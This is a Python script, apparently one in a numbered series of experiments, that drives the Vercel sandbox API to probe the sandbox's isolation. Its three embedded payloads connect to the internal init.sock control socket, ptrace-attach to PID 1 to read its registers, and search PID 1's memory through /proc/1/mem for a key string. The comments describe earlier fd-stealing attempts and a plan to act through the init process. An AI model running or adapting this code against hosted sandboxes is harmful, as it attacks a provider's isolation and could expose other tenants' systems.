# 实验J161: init.sock单独连接重测 + ptrace attach验证 + pubkey内存定位
# j160: pidfd_getfd复制fd成功, 使用触发杀进程; 需借sandbox-init之手
# 方法: cmdA 仅连接init.sock(无其他socket尝试); cmdB ptrace PTRACE_ATTACH+寄存器; cmdC 内存搜pubkey
# 零破坏: 连接后不发送数据; ptrace attach后立即detach; 纯读内存
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=15000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj161"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# cmdA: 仅连接 init.sock, 连接后立即关闭 (不 recv 不 send)
CA = r'''
import socket, time
out = open("/tmp/d161a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start", time.time())
try:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect("/run/vercel/share/init.sock")
    p("CONNECTED", time.time())
    s.close()
    p("CLOSED", time.time())
except Exception as e:
    p("ERR", repr(e), time.time())
p("=== DONE")
out.close()
'''

# cmdB: ptrace attach 验证
CB = r'''
import ctypes, time, os, subprocess
out = open("/tmp/d161b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_SEIZE = 0x4206
PTRACE_GETREGS = 12
class UserRegs(ctypes.Structure):
    _fields_ = [("r15", ctypes.c_ulonglong), ("r14", ctypes.c_ulonglong),
                ("r13", ctypes.c_ulonglong), ("r12", ctypes.c_ulonglong),
                ("rbp", ctypes.c_ulonglong), ("rbx", ctypes.c_ulonglong),
                ("r11", ctypes.c_ulonglong), ("r10", ctypes.c_ulonglong),
                ("r9", ctypes.c_ulonglong), ("r8", ctypes.c_ulonglong),
                ("rax", ctypes.c_ulonglong), ("rcx", ctypes.c_ulonglong),
                ("rdx", ctypes.c_ulonglong), ("rsi", ctypes.c_ulonglong),
                ("rdi", ctypes.c_ulonglong), ("orig_rax", ctypes.c_ulonglong),
                ("rip", ctypes.c_ulonglong), ("cs", ctypes.c_ulonglong),
                ("eflags", ctypes.c_ulonglong), ("rsp", ctypes.c_ulonglong),
                ("ss", ctypes.c_ulonglong), ("fs_base", ctypes.c_ulonglong),
                ("gs_base", ctypes.c_ulonglong), ("ds", ctypes.c_ulonglong),
                ("es", ctypes.c_ulonglong), ("fs", ctypes.c_ulonglong),
                ("gs", ctypes.c_ulonglong)]
def ptrace_attach(pid):
    ctypes.set_errno(0)
    r = libc.ptrace(PTRACE_ATTACH, pid, 0, 0)
    return r, ctypes.get_errno()
def ptrace_detach(pid):
    libc.ptrace(PTRACE_DETACH, pid, 0, 0)
p("yama", sh("cat /proc/sys/kernel/yama/ptrace_scope 2>&1"))
r, e = ptrace_attach(1)
p("attach", r, "errno", e)
if r == 0:
    time.sleep(0.3)
    regs = UserRegs()
    ctypes.set_errno(0)
    rr = libc.ptrace(PTRACE_GETREGS, 1, 0, ctypes.byref(regs))
    p("getregs", rr, "errno", ctypes.get_errno())
    if rr == 0:
        p("rip", hex(regs.rip), "rsp", hex(regs.rsp))
    ptrace_detach(1)
    p("detached")
p("=== DONE")
out.close()
'''

# cmdC: 内存搜 pubkey (通过/proc/1/mem, attach后)
CC = r'''
import ctypes, time, os, struct
out = open("/tmp/d161c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.ptrace.restype = ctypes.c_long
libc.ptrace(16, 1, 0, 0)  # ATTACH
time.sleep(0.3)
# 搜索已知 pubkey 字符串
PUB = b"hteVikOlmwM6AC8tQ0E4ktocDEbYHc9BLe8WI8T4vuk="
# 目标区域: 堆 (从 maps 找 rw 段)
maps = open("/proc/1/maps").read()
hits = []
for line in maps.splitlines():
    parts = line.split()
    if len(parts) < 2:
        continue
    if "rw" not in parts[1]:
        continue
    rng = parts[0].split("-")
    start = int(rng[0], 16)
    end = int(rng[1], 16)
    if end - start > 8 * 1024 * 1024:
        continue
    try:
        f = os.open("/proc/1/mem", os.O_RDONLY)
        os.lseek(f, start, 0)
        chunk = os.read(f, min(end - start, 4 * 1024 * 1024))
        os.close(f)
        idx = 0
        while True:
            i = chunk.find(PUB, idx)
            if i < 0:
                break
            hits.append((start + i, chunk[max(0, i - 64):i + 128]))
            idx = i + 1
    except Exception as e:
        p("read err", hex(start), repr(e))
libc.ptrace(17, 1, 0, 0)  # DETACH
p("hits", len(hits))
for addr, ctx in hits[:10]:
    p("HIT", hex(addr), repr(ctx))
p("=== DONE")
out.close()
'''

run_cmd(sid, CA, "init-sock-only", timeout=100)
catfile(sid, "/tmp/d161a.txt", "d161a", 2000)

run_cmd(sid, CB, "ptrace-test", timeout=100)
catfile(sid, "/tmp/d161b.txt", "d161b", 3000)

run_cmd(sid, CC, "pubkey-locate", timeout=150)
catfile(sid, "/tmp/d161c.txt", "d161c", 5000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
